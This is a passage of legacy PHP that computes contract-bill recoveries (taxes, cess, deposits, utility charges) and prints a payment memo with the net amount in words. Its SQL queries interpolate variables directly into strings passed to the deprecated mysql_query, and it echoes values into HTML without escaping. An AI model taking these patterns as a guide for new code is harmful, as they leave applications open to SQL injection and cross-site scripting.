	while($ERList 	= 	mysql_fetch_object($electricity_recovery_sql))
	{
		$electricity_charge  = 	$electricity_charge+$ERList->electricity_cost;
	}
}
else
{
	$electricity_charge = 0;
}
$total_recovery = $total_recovery + $electricity_charge;
$general_recovery_query = "select * from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
//echo $general_recovery_query;
$general_recovery_sql = mysql_query($general_recovery_query);
if($general_recovery_sql == true)
{
	$GRList 			= 	mysql_fetch_object($general_recovery_sql);
	$sd_amt 			= 	round($GRList->sd_amt);
	$sd_percent 		= 	$GRList->sd_percent;
	$wct_amt 			= 	round($GRList->wct_amt);
	$wct_percent 		= 	$GRList->wct_percent;
	$vat_amt 			= 	round($GRList->vat_amt);
	$vat_percent 		= 	$GRList->vat_percent;
	$mob_adv_amt 		= 	round($GRList->mob_adv_amt);
	$mob_adv_percent 	= 	$GRList->mob_adv_percent;
	$lw_cess_amt 		= 	round($GRList->lw_cess_amt);
	$lw_cess_percent 	= 	$GRList->lw_cess_percent;
	$incometax_amt 		= 	round($GRList->incometax_amt);
	$incometax_percent 	= 	$GRList->incometax_percent;
	$it_cess_amt 		= 	round($GRList->it_cess_amt);
	$it_cess_percent 	= 	$GRList->it_cess_percent;
	$it_edu_amt 		= 	round($GRList->it_edu_amt);
	$it_edu_percent 	= 	$GRList->it_edu_percent;
	$land_rent 			= 	round($GRList->land_rent);
	$liquid_damage 		= 	round($GRList->liquid_damage);
	//$other_recovery_1 	= 	round($GRList->other_recovery_1_amt);
	//$other_recovery_2	= 	round($GRList->other_recovery_2_amt);
	$other_recovery_1 	= 	round($GRList->other_recovery_1);
	$other_recovery_2	= 	round($GRList->other_recovery_2);
	$other_recovery_3	= 	round($GRList->other_recovery_3);
	$other_recovery_1_desc 	= 	$GRList->other_recovery_1_desc;
	$other_recovery_2_desc	= 	$GRList->other_recovery_2_desc;
	$other_recovery_3_desc	= 	$GRList->other_recovery_3_desc;
	if($other_recovery_1_desc == "")
	{
		$other_recovery_1_desc = "Other Recovery 1 ";
	}
	if($other_recovery_2_desc == "")
	{
		$other_recovery_2_desc = "Other Recovery 2 ";
	}
	if($other_recovery_3_desc == "")
	{
		$other_recovery_3_desc = "Other Recovery 3 ";
	}
	$non_dep_machine_equip 	= 	round($GRList->non_dep_machine_equip);
	$non_dep_man_power 	= 	round($GRList->non_dep_man_power);
	$nonsubmission_qa 	= 	round($GRList->nonsubmission_qa);
}
if($non_dep_machine_equip != 0)
{
	$non_dep_machine_equip_print = number_format($non_dep_machine_equip, 2, '.', '');
}
else
{
	$non_dep_machine_equip_print = "NIL";
}

if($non_dep_man_power != 0)
{
	$non_dep_man_power_print = number_format($non_dep_man_power, 2, '.', '');
}
else
{
	$non_dep_man_power_print = "NIL";
}

if($electricity_charge != 0)
{
	$electricity_charge_print = number_format($electricity_charge, 2, '.', '');
}
else
{
	$electricity_charge_print = "NIL";
}

if($water_charge != 0)
{
	$water_charge_print = number_format($water_charge, 2, '.', '');
}
else
{
	$water_charge_print = "NIL";
}
$total_recovery = $total_recovery + $sd_amt+$wct_amt + $vat_amt+$mob_adv_amt + $lw_cess_amt+$incometax_amt + $it_cess_amt+$it_edu_amt + $land_rent+$liquid_damage + $other_recovery_1 + $other_recovery_2 + $other_recovery_3 + $non_dep_machine_equip + $non_dep_man_power + $nonsubmission_qa;
$rrcount = 0;  $total_rec_rel_amt = 0;
$RRDescCivArr = array(); $RRAmtCivArr = array(); $RRDescAccArr = array(); $RRAmtAccArr = array();

$recov_release_query = "select * from recovery_release where sheetid = '$abstsheetid' and rbn = '$rbn'";
$recov_release_sql = mysql_query($recov_release_query);
//echo $recov_release_query;
if($recov_release_sql == true)
{
	if(mysql_num_rows($recov_release_sql)>0)
	{
		while($RecRelList = mysql_fetch_object($recov_release_sql))
		{
			$rec_rel_desc_civil = $RecRelList->description_civil;
			$rec_rel_amt_civil 	= $RecRelList->amount_civil;
			$rec_rel_desc_acc 	= $RecRelList->description_acc;
			$rec_rel_amt_acc 	= $RecRelList->amount_acc;
			array_push($RRDescCivArr,$rec_rel_desc_civil);
			array_push($RRAmtCivArr,$rec_rel_amt_civil);
			array_push($RRDescAccArr,$rec_rel_desc_acc);
			array_push($RRAmtAccArr,$rec_rel_amt_acc);
			$total_rec_rel_amt  = $total_rec_rel_amt+$rec_rel_amt_civil;
			$rrcount++;
		}
	}
}

//$page++;
/*$OverAllSlmDpmAmount = round($OverAllSlmDpmAmount);
$OverAllSlmAmount = round($OverAllSlmAmount);*/
$OverAllSlmDpmAmount = $SlmDpmNetAmount;
$OverAllSlmAmount = $SlmNetAmount;
$OverAllDpmAmount = $DpmNetAmount;
//echo "<p style='page-break-after:always;'></p>";
//echo $title;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
?>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
//echo "<tr><td class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";

////  This is for print Escalation
if(count($EscQtrArray)>0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
$OverAllSlmAmount = round(($OverAllSlmAmount+$Esc_Total_Amt),2);

////  This is for print Revised Escalation
//print_r($RevEscTccAmtArray);
if(count($RevEscQtrArray)>0)
{
	for($q2=0; $q2<count($RevEscQtrArray); $q2++)
	{
		$RevEQtr = $RevEscQtrArray[$q2];
		$RevETccAmt = $RevEscTccAmtArray[$q2];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Revised Escalation for Quarter - ".$RevEQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($RevETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
$OverAllSlmAmount = round(($OverAllSlmAmount+$RevEsc_Total_Amt),2);



//echo '<hr style="border-top: dotted 1px;" />';
//$OverAllSlmAmount = $OverAllSlmAmount + $sec_adv_amount;
$Overall_net_amt_final = round(($OverAllSlmAmount + $sec_adv_amount + $total_rec_rel_amt - $total_recovery),2);
$Overall_net_amt_final = round(($Overall_net_amt_final),2);

echo "<tr style='border:none'><td style='border:none' class='labelbold' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td style='border:none; border-top:1px dashed #000000' class='labelbold' align='right' colspan='2'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none; border-top:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td colspan='2' class='labelbold' align='right' style='border:none'>&nbsp;<u>Recoveries</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td style='border:none' class='labelbold' align='left' colspan='10'></td></tr>";
$ea = 1; $eb = 1; $ed = 1; 
$ea_text = "<b>Under 8[a]</b>"; $eb_text = "<b>Under 8[b]</b>";  $ec_text = "<b>Under 8[c]</b>";  $ed_text = "<b><u>With hold Amount</u></b>";
if($wct_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>W.C.T @ ".number_format($wct_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($wct_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($vat_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>VAT @  ".number_format($vat_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($vat_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";


}
if($lw_cess_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Labour Welfare CESS @ ".number_format($lw_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($lw_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";




}
if($mob_adv_percent != 0)
{
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($incometax_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Income Tax @ ".number_format($incometax_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($incometax_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_cess_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Cess @ ".number_format($it_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_edu_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Education CESS @ ".number_format($it_edu_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_edu_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
//if($water_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Water Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$water_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
//if($electricity_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Electricity Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".$electricity_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
if($land_rent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Rent for Land : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($land_rent, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($liquid_damage != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Liquidated Damages : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($liquid_damage, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_1 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_1_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_1, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_2 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_2_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_2, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_3 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_3_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_3, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($non_dep_machine_equip != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of machineries & equipment as (per clause 18)  : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_machine_equip_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($non_dep_man_power != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of Technical manpower (as per clause 36(i)) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_man_power_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non-Submission of QA related document : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($nonsubmission_qa, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";


if($sd_amt != 0)
{
$eb = 1;
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ec_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Security Deposit @ 5% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($sd_amt, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

// This row is for Recovery Release
if($rrcount>0)
{
	for($rrc=0; $rrc<$rrcount; $rrc++)
	{
	echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ed_text." (".$ed.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$RRDescCivArr[$rrc]." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($RRAmtCivArr[$rrc], 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
	$ed++; $ed_text = "";
	}
}

echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
if($total_recovery != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'></td><td style='border:none' class='labelprint' align='right' colspan='4'>&nbsp;</td><td colspan='2' align='right' style='border:none; border-bottom:1px dashed #000000' class='labelprint'></td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
}

if($Overall_net_amt_final != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'><b>Net Payable Amount :</b> <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='6'><b>".number_format($Overall_net_amt_final, 2, '.', '')."</b></td><td style='border:none'>&nbsp;</td></tr>";
}

//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//$Overall_net_amt_final = "18767031.35";
$split_amt = explode(".",$Overall_net_amt_final);
$rupees_part = $split_amt[0];
$paise_part = $split_amt[1];
$rupee_part_word = number_to_words($rupees_part);

if($paise_part != 0)
{
	$paise_part_word = " and Paise ".number_to_words($paise_part)."";
}
$amount_in_words = $rupee_part_word.$paise_part_word;
echo "<tr style='border:none'><td style='border:none'>&nbsp;</td><td style='border:none'>&nbsp;</td><td style='border:none' class='labelprint' align='left' colspan='12'>Amount: (Rupees ".$amount_in_words.")</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>page ".$page."</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";


if($is_finalbill == "Y"){
$CertCodeArr = array(); $CertDescArr = array(); $CertMBArr = array(); $CertPageArr = array();
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillInspectionCertificate.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillNoClaimCertificate.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillFinalCertificates.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillFinalNotes.php");
echo "<p style='page-break-after:always;'></p>";
}
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
//echo "<p  style='page-break-after:always;'></p>";
for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>
	<?php
	$y++;		
}
echo "<tr class='labelprint'><td colspan='12' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;border-top:2px solid #cacaca;' align='center'> </td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />
<input type="hidden" name="txt_abstractstr" id="txt_abstractstr" value="<?php echo $AbstractStr; ?>" />
<input type="hidden" name="txt_subdivid_slmstr" id="txt_subdivid_slmstr" value="<?php echo $SubdividSlmStr; ?>" />
<input type="hidden" name="txt_rbn_no" id="txt_rbn_no" value="<?php echo $runn_acc_bill_no; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect">
		<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
	</div>
</div> -->

		<div style="text-align:center; height:45px; line-height:45px;" class="printbutton">
			<div class="buttonsection">
			<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
			</div>
			<!--<div class="buttonsection">
			<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
			</div>-->
			<div class="buttonsection">
			<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
			</div>
		</div>

		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
